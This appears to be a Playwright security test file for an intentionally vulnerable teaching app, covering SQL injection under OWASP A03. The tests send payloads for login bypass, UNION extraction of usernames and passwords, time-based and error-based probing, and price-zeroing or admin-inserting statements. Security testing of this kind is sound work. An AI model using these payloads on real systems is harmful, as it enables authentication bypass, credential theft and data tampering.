// OWASP Top 10 A03:2021 – Injection (SQL Injection)
import { test, expect } from '../fixtures/zap-fixtures';

test.describe('SQL Injection Testing', () => {
  test('VULN DEMO: SQL injection in login bypasses authentication', async ({ loginPage, zapConfig, zapUtils }) => {
    console.log(' VULNERABILITY DEMO: Testing SQL injection in login for authentication bypass');
    
    // Use fixture to get SQL injection payloads
    const sqlPayloads = zapUtils.getPayloads().sqlInjection.boolean;
    
    for (const payload of sqlPayloads.slice(0, 2)) { // Test first 2 payloads
      const response = await loginPage.attemptSQLInjection(payload, 'password');
      
      if (response.status() === 200) {
        console.log(`WARNING: SQL Injection successful with payload: ${payload}`);
        const result = await loginPage.getLoginResult();
        expect(result).toContain('"success"');
        break; // Stop after first successful injection
      }
    }
  });

  test('VULN DEMO: UNION-based SQL injection extracts data', async ({ loginPage }) => {
    console.log(' VULNERABILITY DEMO: Testing UNION-based SQL injection for data extraction');
    
    // UNION injection to extract database schema
    const unionPayload = "admin' UNION SELECT username, password FROM users--";
    const response = await loginPage.attemptSQLInjection(unionPayload, 'password');
    
    if (response.status() === 200) {
      console.log('WARNING: UNION SQL injection successful - data extraction possible');
    }
  });

  test('VULN DEMO: Time-based blind SQL injection', async ({ loginPage }) => {
    console.log(' VULNERABILITY DEMO: Testing time-based blind SQL injection');
    
    // Time-based payload to test blind injection
    const timePayload = "admin' AND (SELECT COUNT(*) FROM users WHERE id=1 AND LENGTH(password)>0) AND SLEEP(5)--";
    
    const startTime = Date.now();
    const response = await loginPage.attemptSQLInjection(timePayload, 'password');
    const endTime = Date.now();
    const responseTime = endTime - startTime;
    
    if (responseTime > 4000) {
      console.log('WARNING: Time-based SQL injection detected - response delayed');
    }
  });

  test('VULN DEMO: Error-based SQL injection reveals database info', async ({ loginPage }) => {
    console.log(' VULNERABILITY DEMO: Testing error-based SQL injection for information disclosure');
    
    // Error-based injection to trigger database errors
    const errorPayload = "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))--";
    const response = await loginPage.attemptSQLInjection(errorPayload, 'password');
    
    const responseText = await response.text();
    if (responseText.includes('XPATH syntax error') || responseText.includes('MySQL')) {
      console.log('WARNING: Error-based SQL injection reveals database information');
    }
  });

  test.fixme('SECURITY EXPECTATION: prevents SQL injection attacks', async ({ loginPage, zapUtils }) => {
    // EXPECTED FAILURE: This application is intentionally vulnerable for educational purposes.
    // This test demonstrates what SHOULD happen after security hardening - SQL injection should be blocked.
    // Currently fails because SQL injection succeeds (returns 200) instead of being blocked (400/401/403/422).
    console.log('SECURITY EXPECTATION: Validating defense against SQL injection attacks');
    
    // Use all SQL injection payload types from fixture
    const allPayloads = [
      ...zapUtils.getPayloads().sqlInjection.boolean,
      ...zapUtils.getPayloads().sqlInjection.union,
      ...zapUtils.getPayloads().sqlInjection.errorBased
    ];
    
    for (const payload of allPayloads) {
      const response = await loginPage.attemptSQLInjection(payload, 'password');
      
      // Should not succeed with injection
      expect([400, 401, 403, 422]).toContain(response.status());
      
      const responseText = await response.text();
      // Should not contain SQL error messages - use utility function
      expect(zapUtils.validateErrorMessage(responseText)).toBe(true);
    }
    
    console.log('All SQL injection payloads properly prevented');
  });

  test.fixme('SECURITY EXPECTATION: parameterized queries prevent injection in search', async ({ searchPage }) => {
    // EXPECTED FAILURE: This application is intentionally vulnerable for educational purposes.
    // This test demonstrates what SHOULD happen after security hardening - search should use parameterized queries.
    // Currently fails because search functionality may be vulnerable to SQL injection.
    console.log('SECURITY EXPECTATION: Validating parameterized query protection against SQL injection');
    
    const searchInjectionPayloads = [
      "' OR 1=1--",
      "'; UPDATE products SET price=0--",
      "' UNION SELECT username, password FROM users--",
      "'; INSERT INTO admins VALUES('hacker', 'pwned')--"
    ];
    
    for (const payload of searchInjectionPayloads) {
      const response = await searchPage.search(payload);
      expect([200, 400]).toContain(response.status());
      
      // Response should not indicate successful injection
      const results = searchPage.searchResult;
      const resultsText = await results.textContent();
      expect(resultsText).not.toContain('password');
      expect(resultsText).not.toContain('username');
    }
    
    console.log('Search functionality protected against SQL injection');
  });

  test.fixme('validates proper error handling without information disclosure', async ({ loginPage }) => {
    // EXPECTED FAILURE: This application is intentionally vulnerable for educational purposes.
    // This test demonstrates what SHOULD happen after security hardening - error messages should not disclose database info.
    // Currently fails because server returns detailed SQL error messages (information disclosure vulnerability).
    const malformedInputs = [
      "'",
      "''",
      "\";",
      "\\",
      "admin'/*",
    ];
    
    for (const input of malformedInputs) {
      const response = await loginPage.login(input, 'password');
      const responseText = await response.text();
      
      // Should not reveal database structure or SQL errors
      expect(responseText).not.toMatch(/table|column|database|mysql|sql|syntax|error/i);
    }
  });

});